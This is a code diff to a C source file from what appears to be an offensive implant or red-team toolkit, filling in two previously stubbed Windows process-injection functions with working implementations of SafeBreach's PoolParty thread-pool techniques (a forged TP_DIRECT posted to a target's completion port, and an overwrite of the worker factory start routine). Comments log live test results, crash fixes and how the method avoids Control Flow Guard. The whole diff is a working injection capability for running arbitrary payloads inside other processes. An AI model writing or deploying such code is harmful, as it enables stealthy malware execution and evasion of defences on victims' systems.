@@ -591,15 +591,447 @@ BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parame
 
 #if defined(_M_X64)
 BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
-	(void)context; (void)lpStartAddress; (void)lpParameter;
-	spawn_log("tpdirect: scaffold decline (research pending)", 0x7fffffff);
-	return FALSE;
+	/* SafeBreach "Process Injection Using Windows Thread Pools" variant 7 -
+	 * the target pool's IOCP dequeues a completion whose KeyContext is our
+	 * forged TP_DIRECT and the pool worker calls the Callback field, which
+	 * on Win10 19044 x64 sits at +0x38 (0x08/0x10/0x18 fast-fail the pool
+	 * with 0xC0000409, 0x40 lands on the adjacent field -> 0xC0000005).
+	 * C-25 live 2026-11-14: the 2026-11-13 offset-scan harness verdict was
+	 * PARTIAL - {1@0x00, stub@0x38} fires the callback, but the 1 rides
+	 * the TP_TASK header, the dispatch corrupts the pool's accounting
+	 * arrays, and TppWorkerThread AVs at +0x7f7 (notepad patsy, cdb
+	 * capture). The harness passed 3/3 only because exit(0x1337) outran
+	 * the crash. PoolParty-exact fix: all fields zero except Callback.
+	 * No thread-creation primitive is used anywhere - the dequeuing worker
+	 * is the target's own pool thread.
+	 *
+	 * Chain:
+	 *   1. fork&run: resume the suspended patsy and give init a moment -
+	 *      the thread pool does not exist before LdrInitializeThunk lands
+	 *   2. VirtualAllocEx the 0x60 buffer: TP_DIRECT {all zero except
+	 *      Callback@0x38 = arg-forwarding stub}, payload@0x50/param@0x58
+	 *      stashed beyond the 0x48-byte struct
+	 *   3. walk the target handle table (SystemExtendedHandleInformation),
+	 *      DuplicateHandle handles into us and NtSetIoCompletion with our
+	 *      direct pointer as KeyContext until the FIRST accept. The kernel
+	 *      rejects every non-IOCP object (0xC0000024); a pool IOCP accepts
+	 *      and fires - exactly once (TppCallbackEpilog clears Callback, a
+	 *      second post of the same direct would call NULL).
+	 *
+	 * Note: TpDirectCallback invokes Callback(direct, ...) - the thread
+	 * parameter does NOT ride through (same limitation as the official
+	 * technique; self-locating PIC payloads and our asyncdll, which reads
+	 * its arguments from the patched __POSTEX_USER_ARGS__ buffer, work;
+	 * kit DLLs that read lpReserved do not). */
+	typedef NTSTATUS(WINAPI * NTSETIOCOMPLETION)(HANDLE, PVOID, PVOID, PVOID, PVOID);
+	typedef NTSTATUS(WINAPI * NTQUERYSYSINFO)(ULONG, PVOID, ULONG, PULONG);
+
+	HMODULE nt = GetModuleHandleA("ntdll.dll");
+	if (nt == NULL)
+		return FALSE;
+	NTSETIOCOMPLETION pSetIo = (NTSETIOCOMPLETION)GetProcAddress(nt, "NtSetIoCompletion");
+	NTQUERYSYSINFO pQuerySys = (NTQUERYSYSINFO)GetProcAddress(nt, "NtQuerySystemInformation");
+	if (pSetIo == NULL || pQuerySys == NULL) {
+		spawn_log("tpdirect: ntdll apis missing", 0x7fffffff);
+		return FALSE;
+	}
+
+	/* 1. fork&run: the patsy is SUSPENDED here - arm EVERYTHING into it
+	 * before the resume. The old order (resume first, allocate after)
+	 * raced a rundll32 spawnto that exits the moment its entry runs:
+	 * allocations then hit a dead process (gle=5) and the whole chain
+	 * fell over. Sequence: arm (suspended) -> resume -> pool warmup ->
+	 * post. */
+	int forkrun = context->isSuspended && context->hThread != NULL;
+
+	HANDLE hProcess = context->hProcess;
+	DWORD pid = context->pid;
+
+	/* 2. TP_DIRECT + arg-forwarding stub. TpDirectCallback invokes
+	 * Callback(direct, ...) - the stage entry would see the direct pointer
+	 * instead of its real argument. The real TP_DIRECT (PoolParty
+	 * ThreadPool.hpp) is 0x48 bytes: TP_TASK{Callbacks@0, NumaNode@8,
+	 * IdealProcessor@0xC, ListEntry@0x10}, Lock@0x20,
+	 * IoCompletionInformationList@0x28, Callback@0x38, then
+	 * NumaNode/IdealProcessor@0x40 - every field except Callback stays
+	 * ZERO (C-25 live: a 1 at +0x00 rides the TP_TASK header, the dispatch
+	 * then corrupts the pool's accounting arrays and TppWorkerThread AVs
+	 * at +0x7f7 before the payload can check in; the old offset-scan
+	 * harness only passed because its exit(0x1337) payload outran the
+	 * crash). Stash payload/param BEYOND the struct at +0x50/+0x58 and
+	 * point Callback at a 10-byte stub. The dispatch invokes Callback
+	 * with the standard pool signature Callback(Instance=rcx, Context=
+	 * rdx, ...) - rcx is the TP_CALLBACK_INSTANCE living ON THE WORKER
+	 * STACK, rdx is the completion KeyContext = our direct pointer
+	 * (C-25 live + local tpd_reg_test: rcx-read 3/3 crash at jmp-0,
+	 * rdx-read 3/3 exit 0x1337): rax=[rdx+0x50]; rcx=[rdx+0x58]; jmp rax */
+	unsigned char stubc[] = {
+		0x48, 0x8B, 0x42, 0x50,             /* mov rax, [rdx+0x50] payload  */
+		0x48, 0x8B, 0x4A, 0x58,             /* mov rcx, [rdx+0x58] param    */
+		0xFF, 0xE0                          /* jmp rax                      */
+	};
+	/* alloc RW -> write -> flip RX: the syscall alloc layer does not take
+	 * PAGE_EXECUTE_READ at allocation time (C-25 live: gle=183 on the stub
+	 * alloc; same EC-era fix pattern) */
+	/* full-page request: the syscall alloc layer randomizes bases and a
+	 * 13-byte request collides (C-25 live: gle=183 ERROR_ALREADY_EXISTS) */
+	unsigned char * stub = (unsigned char *)beacon_VirtualAllocEx(hProcess, NULL, 0x1000,
+	                                                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (stub == NULL) {
+		/* C-25 live: the randomized-base syscall alloc layer rejects these
+		 * requests inside the patsy (gle=183) - fall back to the plain API */
+		spawn_log("tpdirect: stub syscall alloc failed, api fallback gle=", (long)GetLastError());
+		stub = (unsigned char *)VirtualAllocEx(hProcess, NULL, 0x1000,
+		                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		if (stub == NULL) {
+			spawn_log("tpdirect: stub alloc failed gle=", (long)GetLastError());
+			return FALSE;
+		}
+	}
+	SIZE_T sgot = 0;
+	if (!beacon_WriteProcessMemory(hProcess, stub, stubc, sizeof(stubc), &sgot) || sgot != sizeof(stubc)) {
+		spawn_log("tpdirect: stub write failed gle=", (long)GetLastError());
+		return FALSE;
+	}
+	{
+		DWORD sold = 0;
+		if (!beacon_VirtualProtectEx(hProcess, stub, 0x1000, PAGE_EXECUTE_READ, &sold)
+				&& !VirtualProtectEx(hProcess, stub, 0x1000, PAGE_EXECUTE_READ, &sold)) {
+			spawn_log("tpdirect: stub protect failed gle=", (long)GetLastError());
+			return FALSE;
+		}
+	}
+	unsigned char * direct = (unsigned char *)beacon_VirtualAllocEx(hProcess, NULL, 0x60,
+	                                                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (direct == NULL) {
+		direct = (unsigned char *)VirtualAllocEx(hProcess, NULL, 0x60,
+		                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		if (direct == NULL) {
+			spawn_log("tpdirect: direct alloc failed gle=", (long)GetLastError());
+			return FALSE;
+		}
+	}
+	{
+		unsigned char buf[0x60];
+		memset(buf, 0, sizeof(buf));
+		/* PoolParty-exact: everything zero except Callback. The old
+		 * RefCount=1 at +0x00 corrupted the TP_TASK header (see above). */
+		*(unsigned long long *)(buf + 0x38) = (unsigned long long)(size_t)stub;
+		*(unsigned long long *)(buf + 0x50) = (unsigned long long)(size_t)lpStartAddress;
+		*(unsigned long long *)(buf + 0x58) = (unsigned long long)(size_t)lpParameter;
+		SIZE_T got = 0;
+		if (!beacon_WriteProcessMemory(hProcess, direct, buf, sizeof(buf), &got) || got != sizeof(buf)) {
+			spawn_log("tpdirect: direct write failed gle=", (long)GetLastError());
+			return FALSE;
+		}
+	}
+	spawn_log("tpdirect: direct armed=", (long)(long long)(size_t)direct);
+
+	/* 2b. fork&run: NOW resume - pool comes up during init, the post below
+	 * lands in its IOCP. Allocating after this point raced the rundll32
+	 * spawnto exit (dead process, gle=5). */
+	if (forkrun) {
+		if (ResumeThread(context->hThread) == (DWORD)-1) {
+			spawn_log("tpdirect: ResumeThread failed gle=", (long)GetLastError());
+			return FALSE;
+		}
+		Sleep(2000);
+		spawn_log("tpdirect: patsy resumed, pool warmup wait done", 0x7fffffff);
+	}
+
+	/* 3. handle-table walk + post, as a retry loop: the bare rundll32
+	 * spawnto exits ~1s after resume, but its thread pool initializes
+	 * within the first few hundred ms - post every 100ms so the first
+	 * pool IOCP that exists catches the TP_DIRECT. The moment a post
+	 * lands, the stage runs and keeps the process alive. */
+	ULONG_PTR posted = 0, accepted = 0;
+	for (int round = 0; round < 40; round++) {
+	ULONG len = 0x100000;
+	unsigned char * hbuf = (unsigned char *)malloc(len);
+	if (hbuf == NULL)
+		return FALSE;
+	NTSTATUS st;
+	int tries = 0;
+	if (round == 0)
+		spawn_log("tpdirect: walk begin len=", (long)len);
+	while (TRUE) {
+		ULONG need = 0;
+		st = pQuerySys(64 /*SystemExtendedHandleInformation*/, hbuf, len, &need);
+		if (st == 0xC0000004 /*STATUS_INFO_LENGTH_MISMATCH*/) {
+			if (++tries > 8 || need == 0 || need > 0x8000000) {
+				spawn_log("tpdirect: walk bound exit need=", (long)need);
+				free(hbuf);
+				return FALSE;
+			}
+			unsigned char * nb = (unsigned char *)realloc(hbuf, need);
+			if (nb == NULL) {
+				free(hbuf);
+				return FALSE;
+			}
+			hbuf = nb;
+			len = need;
+			continue;
+		}
+		break;
+	}
+	if (st != 0) {
+		spawn_log("tpdirect: handle walk failed st=", (long)st);
+		free(hbuf);
+		return FALSE;
+	}
+
+	ULONG_PTR count = *(ULONG_PTR *)hbuf;
+	unsigned char * row = hbuf + 16; /* header: count(8) + pad(8) */
+	HANDLE me = GetCurrentProcess();
+	for (ULONG_PTR i = 0; i < count; i++, row += 40) {
+		ULONG_PTR hpid = *(ULONG_PTR *)(row + 8);
+		ULONG_PTR hval = *(ULONG_PTR *)(row + 16);
+		if (hpid != (ULONG_PTR)pid || hval == 0 || hval > 0xFFFFFFFF)
+			continue;
+		HANDLE dup = NULL;
+		if (!DuplicateHandle(hProcess, (HANDLE)(size_t)hval, me, &dup, 0, FALSE, DUPLICATE_SAME_ACCESS))
+			continue;
+		posted++;
+		NTSTATUS s2 = pSetIo(dup, direct, NULL, NULL, NULL);
+		CloseHandle(dup);
+		if (s2 == 0) {
+			accepted++;
+			/* ONE dispatch only: TppCallbackEpilog clears the work
+			 * item's Callback (+0x38) after the first worker runs it.
+			 * Posting the same TP_DIRECT to every accepting IOCP makes
+			 * sibling pool workers dispatch it again AFTER the epilog
+			 * zeroed Callback -> TppWorkerThread+0x456 calls NULL ->
+			 * EXECUTE at 0 (C-25 live, notepad patsy: 3 accepted IOCPs,
+			 * crash every round; the first dispatch DID fire). */
+			break;
+		}
+	}
+	free(hbuf);
+	if (round == 0) {
+		spawn_log("tpdirect: posted=", (long)posted);
+		spawn_log("tpdirect: accepted iocp=", (long)accepted);
+	}
+	if (accepted > 0)
+		break;
+	Sleep(100);
+	}
+	if (accepted == 0) {
+		spawn_log("tpdirect: no pool iocp accepted", 0x7fffffff);
+		return FALSE;
+	}
+
+	Sleep(500);
+	spawn_log("tpdirect: armed and queued", 0x7fffffff);
+	return TRUE;
 }
 
 BOOL inject_via_tpstart_routine_stub(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
-	(void)context; (void)lpStartAddress; (void)lpParameter;
-	spawn_log("tpstartstub: scaffold decline (research pending)", 0x7fffffff);
-	return FALSE;
+	/* SafeBreach PoolParty variant "Worker Factory Start Routine
+	 * Overwrite" (0xC): every TpWorkerFactory's StartRoutine IS
+	 * ntdll!TppWorkerThread - the kernel entry for NEW pool worker
+	 * threads. Temporarily overwrite those bytes in the target with a
+	 * stub [mov rax,imm64 payload][mov rcx,imm64 param][jmp rax], then
+	 * NtSetInformationWorkerFactory(ThreadMinimum = TotalWorkerCount+1)
+	 * forces the pool to mint a fresh worker whose thread start lands on
+	 * our stub - the payload runs with rcx = its real parameter (the
+	 * thread-entry ABI hands the StartParameter in rcx; we clobber it
+	 * with ours before jumping). 300ms later we restore the original
+	 * bytes so the pool stays healthy.
+	 *
+	 * Advantages over TpDirect (0xB): no TP_DIRECT layout, no IOCP post,
+	 * no TppCallbackEpilog races - and CFG never blinks because the
+	 * start ADDRESS stays a legit ntdll .text address (only the bytes
+	 * under it change, COW-private) and our raw stub has no
+	 * CFG-instrumented indirect branches.
+	 *
+	 * Factory discovery: walk the target's handles and PROBE each
+	 * duplicate with NtQueryInformationWorkerFactory - non-factories
+	 * fail the query (no NtQueryObject deadlock risk). Any factory
+	 * works: they all share the same TppWorkerThread StartRoutine.
+	 *
+	 * C-25 2026-11-14: fork&run patsies are SUSPENDED with no pool yet -
+	 * same sequencing as TpDirect (resume -> 2s warmup -> arm). Known
+	 * race: a second worker minted inside the 300ms window would re-run
+	 * the stub (accepted, same class as the TpDirect epilog race). */
+	typedef NTSTATUS(WINAPI * NTQIWF)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+	typedef NTSTATUS(WINAPI * NTSIWF)(HANDLE, ULONG, PVOID, ULONG);
+	/* WORKER_FACTORY_BASIC_INFORMATION (x64, 120 bytes) - fields we use:
+	 *   ULONG  TotalWorkerCount @ +52
+	 *   PVOID  StartRoutine     @ +72  (== ntdll!TppWorkerThread) */
+	struct WF_BASIC_INFO {
+		unsigned long long Timeout, RetryTimeout, IdleTimeout;
+		unsigned char Paused, TimerSet, QueuedToExWorker, MayCreate,
+		              CreateInProgress, InsertedIntoQueue, Shutdown;
+		unsigned long BindingCount, ThreadMinimum, ThreadMaximum,
+		              PendingWorkerCount, WaitingWorkerCount,
+		              TotalWorkerCount, ReleaseCount;
+		long long InfiniteWaitGoal;
+		void * StartRoutine;
+		void * StartParameter;
+		void * ProcessId;
+		unsigned long long StackReserve, StackCommit;
+		long LastThreadCreationStatus;
+	};
+
+	HMODULE nt = GetModuleHandleA("ntdll.dll");
+	if (nt == NULL)
+		return FALSE;
+	NTQIWF pQuery = (NTQIWF)GetProcAddress(nt, "NtQueryInformationWorkerFactory");
+	NTSIWF pSet = (NTSIWF)GetProcAddress(nt, "NtSetInformationWorkerFactory");
+	if (pQuery == NULL || pSet == NULL) {
+		spawn_log("tpstartstub: ntdll apis missing", 0x7fffffff);
+		return FALSE;
+	}
+
+	/* 1. fork&run sequencing: the suspended patsy has no pool yet */
+	int forkrun = context->isSuspended && context->hThread != NULL;
+	if (forkrun) {
+		if (ResumeThread(context->hThread) == (DWORD)-1) {
+			spawn_log("tpstartstub: ResumeThread failed gle=", (long)GetLastError());
+			return FALSE;
+		}
+		Sleep(2000);
+		spawn_log("tpstartstub: patsy resumed, pool warmup done", 0x7fffffff);
+	}
+	HANDLE hProcess = context->hProcess;
+	DWORD pid = context->pid;
+
+	/* 2. find a TpWorkerFactory handle by probing duplicates */
+	ULONG len = 0x100000;
+	unsigned char * hbuf = (unsigned char *)malloc(len);
+	if (hbuf == NULL)
+		return FALSE;
+	typedef NTSTATUS(WINAPI * NTQUERYSYS)(ULONG, PVOID, ULONG, PULONG);
+	NTQUERYSYS pQuerySys = (NTQUERYSYS)GetProcAddress(nt, "NtQuerySystemInformation");
+	if (pQuerySys == NULL) {
+		free(hbuf);
+		return FALSE;
+	}
+	NTSTATUS st;
+	int tries = 0;
+	while (TRUE) {
+		ULONG need = 0;
+		st = pQuerySys(64 /*SystemExtendedHandleInformation*/, hbuf, len, &need);
+		if (st == 0xC0000004) {
+			if (++tries > 8 || need == 0 || need > 0x8000000) {
+				spawn_log("tpstartstub: walk bound exit need=", (long)need);
+				free(hbuf);
+				return FALSE;
+			}
+			unsigned char * nb = (unsigned char *)realloc(hbuf, need);
+			if (nb == NULL) {
+				free(hbuf);
+				return FALSE;
+			}
+			hbuf = nb;
+			len = need;
+			continue;
+		}
+		break;
+	}
+	if (st != 0) {
+		spawn_log("tpstartstub: handle walk failed st=", (long)st);
+		free(hbuf);
+		return FALSE;
+	}
+	ULONG_PTR count = *(ULONG_PTR *)hbuf;
+	unsigned char * row = hbuf + 16;
+	struct WF_BASIC_INFO info;
+	HANDLE factory = NULL;
+	HANDLE me = GetCurrentProcess();
+	for (ULONG_PTR i = 0; i < count && factory == NULL; i++, row += 40) {
+		ULONG_PTR hpid = *(ULONG_PTR *)(row + 8);
+		ULONG_PTR hval = *(ULONG_PTR *)(row + 16);
+		if (hpid != (ULONG_PTR)pid || hval == 0 || hval > 0xFFFFFFFF)
+			continue;
+		HANDLE dup = NULL;
+		if (!DuplicateHandle(hProcess, (HANDLE)(size_t)hval, me, &dup, 0, FALSE, DUPLICATE_SAME_ACCESS))
+			continue;
+		memset(&info, 0, sizeof(info));
+		ULONG gotlen = 0;
+		if (pQuery(dup, 7 /*WorkerFactoryBasicInformation*/, &info, sizeof(info), &gotlen) == 0
+				&& info.StartRoutine != NULL) {
+			factory = dup; /* keep it open for the set below */
+			break;
+		}
+		CloseHandle(dup);
+	}
+	free(hbuf);
+	if (factory == NULL) {
+		spawn_log("tpstartstub: no worker factory found", 0x7fffffff);
+		return FALSE;
+	}
+	spawn_log("tpstartstub: factory found, workers=", (long)info.TotalWorkerCount);
+	spawn_log("tpstartstub: start routine=", (long)(long long)(size_t)info.StartRoutine);
+
+	/* 3. save the original TppWorkerThread entry bytes */
+	unsigned char orig[24];
+	SIZE_T rgot = 0;
+	if (!beacon_ReadProcessMemory(hProcess, info.StartRoutine, orig, sizeof(orig), &rgot)
+			|| rgot != sizeof(orig)) {
+		if (!ReadProcessMemory(hProcess, info.StartRoutine, orig, sizeof(orig), &rgot)
+				|| rgot != sizeof(orig)) {
+			spawn_log("tpstartstub: read entry failed gle=", (long)GetLastError());
+			CloseHandle(factory);
+			return FALSE;
+		}
+	}
+
+	/* 4. flip the page RWX and plant the stub */
+	DWORD oldp = 0;
+	if (!VirtualProtectEx(hProcess, info.StartRoutine, 0x1000, PAGE_EXECUTE_READWRITE, &oldp)) {
+		spawn_log("tpstartstub: protect failed gle=", (long)GetLastError());
+		CloseHandle(factory);
+		return FALSE;
+	}
+	unsigned char stub[22];
+	stub[0] = 0x48; stub[1] = 0xB8;                     /* mov rax, imm64 */
+	memcpy(stub + 2, &lpStartAddress, 8);
+	stub[10] = 0x48; stub[11] = 0xB9;                   /* mov rcx, imm64 */
+	memcpy(stub + 12, &lpParameter, 8);
+	stub[20] = 0xFF; stub[21] = 0xE0;                   /* jmp rax        */
+	SIZE_T wgot = 0;
+	BOOL wok = beacon_WriteProcessMemory(hProcess, info.StartRoutine, stub, sizeof(stub), &wgot)
+	           && wgot == sizeof(stub);
+	if (!wok) {
+		wok = WriteProcessMemory(hProcess, info.StartRoutine, stub, sizeof(stub), &wgot)
+		      && wgot == sizeof(stub);
+	}
+	if (!wok) {
+		spawn_log("tpstartstub: stub write failed gle=", (long)GetLastError());
+		DWORD back = 0;
+		VirtualProtectEx(hProcess, info.StartRoutine, 0x1000, oldp, &back);
+		CloseHandle(factory);
+		return FALSE;
+	}
+	spawn_log("tpstartstub: stub planted, forcing new worker", 0x7fffffff);
+
+	/* 5. force the pool to mint a fresh worker thread (kernel start =
+	 *    StartRoutine = our stub) */
+	ULONG newmin = info.TotalWorkerCount + 1;
+	NTSTATUS s2 = pSet(factory, 4 /*WorkerFactoryThreadMinimum*/, &newmin, sizeof(newmin));
+	CloseHandle(factory);
+	if (s2 != 0) {
+		spawn_log("tpstartstub: set thread minimum st=", (long)s2);
+		DWORD back = 0;
+		WriteProcessMemory(hProcess, info.StartRoutine, orig, sizeof(orig), &wgot);
+		VirtualProtectEx(hProcess, info.StartRoutine, 0x1000, oldp, &back);
+		return FALSE;
+	}
+
+	/* 6. let the fresh worker start + run the stub, then restore */
+	Sleep(300);
+	wgot = 0;
+	if (!WriteProcessMemory(hProcess, info.StartRoutine, orig, sizeof(orig), &wgot)
+			|| wgot != sizeof(orig)) {
+		spawn_log("tpstartstub: restore failed gle=", (long)GetLastError());
+	}
+	{
+		DWORD back = 0;
+		VirtualProtectEx(hProcess, info.StartRoutine, 0x1000, oldp, &back);
+	}
+	spawn_log("tpstartstub: entry restored, armed", 0x7fffffff);
+	return TRUE;
 }
 
 /* implementation lives in src/earlycascade.cpp (4.12 EarlyCascade) */
